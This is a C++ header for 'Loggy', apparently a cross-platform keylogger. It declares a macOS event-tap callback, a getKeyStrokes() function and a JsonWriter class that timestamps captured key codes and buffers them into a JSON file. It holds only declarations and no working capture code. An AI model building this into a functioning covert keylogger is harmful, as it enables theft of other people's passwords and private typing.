#ifdef __APPLE__
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
CGEventRef eventCallback(CGEventTapProxy, CGEventType, CGEventRef, void *);
#endif

#ifdef _WIN32
#include <Windows.h>
#endif

#ifdef linux
//TODO: Include Linux header files
#endif

#ifndef LOGGY_CORE_H
#define LOGGY_CORE_H

#include <ctime>
#include <string>
#include <iostream>
#include <fstream>
#include "types.h"

void getKeyStrokes();

namespace Loggy {
    class Core {
    public:
        Core();
    };

    class JsonWriter {
    public:
        JsonWriter(Loggy::Types::OPERATING_SYSTEM system);
        /*
        * Writes data to buffer and prepares to write to temporary JSON file.
        *
        * @param data Raw virtual key code mapped to literal character.
        * @param rawData Raw virtual key code.
        * @return void
        */
        void Write(char data, unsigned long rawData);
        ~JsonWriter();
    private:
        time_t _timeGenesis;
        Loggy::Types::OPERATING_SYSTEM _operatingSystem;
        char* _buffer;
    };
}

#endif
